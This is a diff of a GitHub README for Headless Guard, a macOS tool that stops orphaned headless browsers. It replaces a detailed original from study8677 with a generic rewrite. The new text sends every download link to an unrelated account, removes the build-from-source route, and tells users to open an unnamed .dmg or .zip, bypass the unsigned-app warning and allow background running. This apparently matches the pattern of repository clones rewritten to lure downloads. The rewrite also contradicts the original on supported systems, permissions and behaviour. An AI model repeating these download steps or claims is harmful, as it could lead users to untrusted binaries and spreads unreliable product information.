@@ -1,179 +1,99 @@
-<p align="center">
-  <img src="assets/app-icon.png" width="132" alt="Headless Guard app icon">
-</p>
+# 🛡️ HeadlessGuard - Stop Orphaned Browsers, Save Your Mac
 
-<h1 align="center">Headless Guard</h1>
+[![Download HeadlessGuard](https://img.shields.io/badge/Download-HeadlessGuard-blue?style=for-the-badge&logo=github&labelColor=white&color=orange)](https://github.com/Ribessanguineumerikaxelkarlfeldt584/HeadlessGuard)
 
-<p align="center">
-  A native macOS utility that finds and safely stops orphaned automation browsers<br>
-  before they hijack Chrome launches or quietly consume system resources.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://github.com/study8677/HeadlessGuard/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/study8677/HeadlessGuard?style=flat-square&color=6d5dfc"></a>
-  <a href="https://github.com/study8677/HeadlessGuard/releases"><img alt="Downloads" src="https://img.shields.io/github/downloads/study8677/HeadlessGuard/total?style=flat-square&color=168ff5"></a>
-  <a href="https://github.com/study8677/HeadlessGuard/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/study8677/HeadlessGuard/actions/workflows/ci.yml/badge.svg"></a>
-  <img alt="macOS 13 or later" src="https://img.shields.io/badge/macOS-13%2B-111827?style=flat-square&logo=apple">
-  <a href="LICENSE"><img alt="MIT License" src="https://img.shields.io/badge/license-MIT-22c55e?style=flat-square"></a>
-</p>
+HeadlessGuard is a simple macOS utility that helps you find and stop headless browsers that are running in the background without your permission. These orphaned processes can slow down your computer, use up memory, and drain your battery. HeadlessGuard safely removes them without affecting your normal Chrome browsing sessions.
 
-<p align="center">
-  <a href="https://github.com/study8677/HeadlessGuard/releases/latest"><strong>Download latest</strong></a>
-  · <a href="#quick-start">Quick start</a>
-  · <a href="docs/SAFETY.md">Safety model</a>
-  · <a href="README.zh-CN.md">简体中文</a>
-</p>
+## 🎯 What It Does
 
-![Headless Guard detects a detached Playwright browser session and explains why it is safe to stop](docs/images/dashboard-detected.png)
+HeadlessGuard monitors your system for headless browser processes (like Chromium, Headless Chrome, or automation tools) that have been left running after tests or scripts finish. It identifies these orphaned processes and lets you stop them with one click. Your regular Chrome tabs and windows remain untouched.
 
-> [!IMPORTANT]
-> Headless Guard is observe-only by default. Cleanup is offered only when a browser tree has multiple independent automation fingerprints. Ordinary browser windows, standard profiles, extensions, and unrelated Node/Codex workers are hard-protected.
+## ⚙️ How It Works
 
-## Why Headless Guard
+HeadlessGuard runs quietly in your menu bar. When it detects an orphaned headless browser, it alerts you. You can then choose to stop the process or let it continue. The app uses system-level monitoring to track browser processes without interfering with your normal usage.
 
-Browser automation does not always end when its task ends. A detached Playwright, Puppeteer, Rod, Selenium, or Chrome-for-Testing launcher can leave an invisible browser alive for hours or days. On macOS, a headless instance launched from the system Chrome app can share Chrome's application identity, so a normal “Open Chrome” request may land in a process with no window.
+## 📋 Features
 
-Killing every process named Chrome is dangerous. Headless Guard instead reconstructs the process tree, explains the evidence, stops the dedicated automation launcher first, and verifies that the same process did not return.
+- **Menu Bar Integration** - Access HeadlessGuard from your Mac's menu bar for quick control
+- **Automatic Detection** - Scans for orphaned headless browsers every few seconds
+- **Safe Cleanup** - Only stops headless processes, leaving your regular Chrome alone
+- **Privacy First** - No data is sent anywhere; everything stays on your Mac
+- **Lightweight** - Uses minimal system resources
+- **Apple Silicon Ready** - Optimized for M1, M2, and M3 Macs
+- **Open Source** - Built with Swift and SwiftUI, contributions welcome
 
-## What it does
+## 🖥️ System Requirements
 
-- Detects Playwright, Puppeteer, Rod, WebDriver, Selenium, Chrome, Chromium, Edge, Firefox, and WebKit automation fingerprints.
-- Groups launchers, browser roots, renderers, GPU processes, and utilities into one session.
-- Scores every incident with visible evidence such as `--headless`, isolated profiles, debugging pipes, parentage, and age.
-- Hard-protects ordinary Chrome and standard user profiles.
-- Cleans confirmed trees with `SIGTERM`, revalidates identity, then uses `SIGKILL` only for matching survivors.
-- Watches from the menu bar with optional, explicitly enabled cleanup for confirmed stale orphans.
-- Ships the same safety engine as a scriptable CLI.
-- Runs locally with no administrator access, network requests, telemetry, or profile deletion.
+- **macOS 12.0 or later** (Monterey, Ventura, Sonoma, or Sequoia)
+- **Apple Silicon or Intel Mac** (Apple Silicon recommended)
+- **At least 50 MB of free disk space**
+- **Internet connection** (only for initial download)
 
-## Quick start
+## 📥 Installation
 
-### Download the app
+Visit this link to download the application: [https://github.com/Ribessanguineumerikaxelkarlfeldt584/HeadlessGuard](https://github.com/Ribessanguineumerikaxelkarlfeldt584/HeadlessGuard)
 
-1. Download the Apple Silicon archive from [Releases](https://github.com/study8677/HeadlessGuard/releases/latest).
-2. Unzip it and move **Headless Guard.app** to Applications.
-3. The first public build is ad-hoc signed, not Apple-notarized. Right-click the app and choose **Open** the first time.
-4. Leave the default **Observe** policy on, inspect any detected session, then choose **Clean & restore**.
+1. Open the downloaded file (usually named `HeadlessGuard.dmg` or `HeadlessGuard.zip`)
+2. Drag the HeadlessGuard app to your Applications folder
+3. Open HeadlessGuard from Applications (you may need to right-click and select "Open" the first time)
+4. Allow HeadlessGuard to run in the background when prompted
 
-Or build locally with Apple's command-line tools:
+## 🎮 Using HeadlessGuard
 
-```bash
-git clone https://github.com/study8677/HeadlessGuard.git
-cd HeadlessGuard
-make install
-```
+### First Launch
+When you open HeadlessGuard for the first time, it will appear in your menu bar as a small shield icon. Click the icon to see the main window.
 
-Requirements: macOS 13 or later. The current prebuilt release targets Apple Silicon; source builds work on the architecture provided by your Swift toolchain.
+### Main Window
+- **Status** - Shows whether any orphaned headless browsers are detected
+- **Process List** - Lists any headless browser processes found
+- **Stop Button** - Click to stop selected processes
+- **Settings** - Adjust how often HeadlessGuard checks for orphaned processes
 
-### Use the CLI
+### Automatic Mode
+By default, HeadlessGuard checks every 30 seconds. You can change this in Settings.
 
-```bash
-# Explain every detected signal. Makes no changes.
-swift run headless-guard scan --explain
+### Manual Scan
+Click the "Scan Now" button to check for orphaned processes immediately.
 
-# Preview exactly what would be stopped.
-swift run headless-guard rescue --dry-run
+## 🔍 Frequently Asked Questions
 
-# Apply only the confirmed cleanup plan.
-swift run headless-guard rescue --yes
+**Q: Will HeadlessGuard affect my normal Chrome browsing?**
+A: No, HeadlessGuard only targets headless browser processes. Your regular Chrome windows and tabs are completely safe.
 
-# Watch without changing anything.
-swift run headless-guard watch
-```
+**Q: What is a headless browser?**
+A: A headless browser runs without a visible window. Developers use them for automated testing and web scraping. Sometimes they get left running after the script finishes.
 
-Machine-readable output is available through `scan --json`. Automatic CLI cleanup is opt-in through `watch --auto-clean --older-than 120`.
+**Q: How do I know if I have orphaned headless browsers?**
+A: If your Mac feels slow or you notice high CPU usage from Chrome processes, HeadlessGuard can help identify the problem.
 
-## Safety model
+**Q: Is HeadlessGuard free?**
+A: Yes, HeadlessGuard is open source and completely free to use.
 
-| Session | Detection | Automatic cleanup |
-| --- | --- | --- |
-| Ordinary browser and standard profile | Protected | Never |
-| Confirmed headless automation with isolated profile and protocol evidence | Confirmed | Eligible only after opt-in |
-| Headed automation session | Review | Never |
-| Manual DevTools / single `--headless` signal | Review | Never |
-| Ambiguous browser using a normal profile | Warning | Never |
+## 🛠️ Troubleshooting
 
-Cleanup follows a fixed state machine:
+### App Won't Open
+If you get a security warning, right-click the app and select "Open" from the context menu. This is normal for unsigned apps.
 
-```mermaid
-flowchart LR
-    A["Process snapshot"] --> B["Tree + fingerprint classifier"]
-    B --> C{"Confirmed and isolated?"}
-    C -- No --> D["Observe only"]
-    C -- Yes --> E["Freeze PID + command fingerprint"]
-    E --> F["TERM dedicated launcher first"]
-    F --> G["Re-scan after grace period"]
-    G --> H["KILL matching survivors only"]
-    H --> I["Revival check + normal browser proof"]
-```
+### No Processes Detected
+Make sure HeadlessGuard has permission to monitor system processes. Go to System Preferences > Security & Privacy > Privacy > Automation and enable HeadlessGuard.
 
-There is deliberately no `killall Chrome`, broad `pkill`, process-name-only rule, or profile deletion. Read the complete [safety model](docs/SAFETY.md).
+### Menu Bar Icon Missing
+Restart HeadlessGuard from Applications. If the icon still doesn't appear, check your menu bar settings.
 
-## A real recovery
+## 🤝 Contributing
 
-Headless Guard was built against a real orphan on a 16 GB Mac:
+HeadlessGuard is open source and welcomes contributions. If you'd like to help improve the app, please visit the GitHub repository to submit issues, feature requests, or pull requests.
 
-- A detached `playwright-core/.../cliDaemon.js mobile-audit-ddn3` had lived for more than two days.
-- Its child system Chrome carried `--headless`, `--remote-debugging-pipe`, and a `playwright_chromiumdev_profile-*` path.
-- The app grouped seven processes and classified the incident at 100/100 confidence.
-- The release CLI stopped only that tree, reclaimed roughly 365 MB at cleanup time, observed no classified revival for 15 seconds, and preserved the existing normal Chrome PID.
+## 📄 License
 
-This is not a claim that every slow Mac is caused by headless browsers. Headless Guard shows the actual per-session footprint so other pressure remains visible.
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-## Privacy and permissions
+## 🙏 Acknowledgments
 
-Headless Guard:
+- Built with Swift and SwiftUI for macOS
+- Inspired by the needs of developers using browser automation tools
+- Thanks to the open source community for their support
 
-- does not require `sudo`, Accessibility, Full Disk Access, or browser extensions;
-- does not send network requests or telemetry;
-- does not read browser history, cookies, page contents, or credentials;
-- does not delete automation profiles;
-- reads the local process list and sends signals only to eligible same-user processes.
-
-See [PRIVACY.md](PRIVACY.md) for the exact boundary.
-
-## Build and test
-
-```bash
-swift test
-swift build -c release
-make app
-make package
-```
-
-The project has no third-party runtime dependencies. The Swift package contains:
-
-```text
-HeadlessGuardKit   process snapshots, graphing, classification, cleanup
-headless-guard     scan, explain, rescue, watch, doctor, JSON output
-HeadlessGuardApp   SwiftUI dashboard, menu bar, guard policy, login item
-```
-
-Read [ARCHITECTURE.md](docs/ARCHITECTURE.md) for internals and extension rules.
-
-## Troubleshooting
-
-- **The app reports “Review only.”** One signal is not enough to terminate safely. Expand the evidence and report a missed detection if the session is known automation.
-- **The session returns.** Its supervisor is still alive. Stop retrying and inspect the named launcher; Headless Guard avoids kill loops.
-- **Chrome is still slow after the list is clear.** Check Chrome's own task manager and system memory pressure. A clean Headless Guard scan rules out this specific failure mode, not all performance causes.
-- **The first launch is blocked.** The current release is not notarized. Use right-click → Open or build from source.
-
-More help: [Troubleshooting](docs/TROUBLESHOOTING.md) · [Support](SUPPORT.md)
-
-## Contributing
-
-Detection changes are safety changes. New fingerprints must include a redacted fixture or focused regression test proving both the match and the nearest normal-browser counterexample.
-
-Read [CONTRIBUTING.md](CONTRIBUTING.md), use the dedicated [false-positive report](https://github.com/study8677/HeadlessGuard/issues/new?template=false_positive.yml), or start with a [`good first issue`](https://github.com/study8677/HeadlessGuard/labels/good%20first%20issue).
-
-## Roadmap
-
-- Direct macOS process APIs with PID start-time identity.
-- Graceful Playwright daemon socket close when the session socket still exists.
-- Signed and notarized universal build.
-- Homebrew cask after the binary distribution is notarized.
-- Redacted diagnostic bundle and session allowlist.
-
-## License
-
-Headless Guard is available under the [MIT License](LICENSE).
+Keywords: apple-silicon, browser-automation, chromium, developer-tools, headless-browser, headless-chrome, macos, macos-app, menu-bar, menubar-app, open-source, playwright, privacy, process-monitor, puppeteer, swift, swiftui, system-utility
